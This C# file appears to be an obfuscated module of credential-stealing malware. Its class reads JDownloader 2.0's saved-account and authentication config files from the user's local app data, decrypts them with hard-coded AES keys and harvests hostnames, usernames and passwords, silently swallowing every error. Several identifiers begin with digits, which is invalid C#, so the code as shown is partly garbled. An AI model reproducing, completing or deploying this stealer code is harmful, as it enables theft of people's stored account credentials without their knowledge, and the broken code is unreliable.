using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using C6Zy;
using rCOGWW;

namespace rk937aHHc
{
	public class JDownloader : EtbH
	{
		public JDownloader()
		{
			this.Aqf3K = "JDownloader 2.0";
		}

		public string Aqf3K { get; set; }

		public List<WTitxI2m> Grab()
		{
			List<WTitxI2m> list = new List<WTitxI2m>();

			list.AddRange(this.lFldcEH4());
			list.AddRange(this.zV6());

			return list;
		}


		private List<WTitxI2m> lFldcEH4()
		{
			List<WTitxI2m> list = new List<WTitxI2m>();

			try
			{
				string cfgDir = Path.Combine(
					Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
					"JDownloader 2.0\\cfg"
				);

				if (!Directory.Exists(cfgDir))
					return list;

				string accountsPath = Path.Combine(
					cfgDir,
					"org.jdownloader.settings.AccountSettings.accounts.ejs"
				);

				if (!File.Exists(accountsPath))
					return list;

				byte[] key = new byte[]
				{
					1, 6, 4, 5, 2, 7, 4, 3,
					12, 61, 14, 75, 254, 249, 212, 33
				};

				string decryptedJson = JDownloader.AZ4CZs(
					File.ReadAllBytes(accountsPath),
					key
				);

				y5l84 parser = new y5l84();

				Dictionary<string, List<JDownloader.Qucxx>> accounts =
					parser.ehXXPvnprk<Dictionary<string, List<JDownloader.Qucxx>>>(decryptedJson);

				foreach (var kv in accounts)
				{
					foreach (var account in kv.Value)
					{
						try
						{
							if (!string.IsNullOrEmpty(account.8JvVR4uGAzd) ||
								!string.IsNullOrEmpty(account.BWiPaBdhOex))
							{
								list.Add(new WTitxI2m(
									account.A3siKqvH9RJ,
									account.8JvVR4uGAzd,
									account.BWiPaBdhOex,
									this.Aqf3K
								));
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}

			return list;
		}

		private List<WTitxI2m> zV6()
		{
			List<WTitxI2m> list = new List<WTitxI2m>();

			try
			{
				string cfgDir = Path.Combine(
					Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
					"JDownloader 2.0\\cfg"
				);

				if (!Directory.Exists(cfgDir))
					return list;

				string authPath = Path.Combine(
					cfgDir,
					"jd.controlling.authentication.AuthenticationControllerSettings.list.ejs"
				);

				if (!File.Exists(authPath))
					return list;

				byte[] key = new byte[]
				{
					2, 4, 4, 5, 2, 7, 4, 3,
					12, 61, 14, 75, 254, 249, 212, 33
				};

				string decryptedJson = JDownloader.AZ4CZs(
					File.ReadAllBytes(authPath),
					key
				);

				y5l84 parser = new y5l84();
				List<JDownloader.OQq> accounts =
					parser.ehXXPvnprk<List<JDownloader.OQq>>(decryptedJson);

				foreach (JDownloader.OQq account in accounts)
				{
					try
					{
						if (!string.IsNullOrEmpty(account.GvjA4a0) ||
							!string.IsNullOrEmpty(account.2y7SZj))
						{
							list.Add(new WTitxI2m(
								account.tuPdanv + "://" + account.R2ru,
								account.GvjA4a0,
								account.2y7SZj,
								this.Aqf3K
							));
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}

			return list;
		}
		private static string AZ4CZs(byte[] encryptedData, byte[] key)
		{
			string result = null;

			using (Aes aes = Aes.Create())
			{
				aes.Key = key;
				aes.IV = key;
				aes.Mode = CipherMode.CBC;

				ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

				using (MemoryStream ms = new MemoryStream(encryptedData))
				using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
				using (StreamReader sr = new StreamReader(cs))
				{
					result = sr.ReadToEnd();
				}
			}

			return result;
		}

		public class Qucxx
		{
			public string A3siKqvH9RJ { get; set; }

			public string BWiPaBdhOex { get; set; }

			public string 8JvVR4uGAzd { get; set; }
		}

		public class OQq
		{
			public string R2ru { get; set; }

			public string 2y7SZj { get; set; }

			public string tuPdanv { get; set; }

			public string GvjA4a0 { get; set; }
		}
	}
}
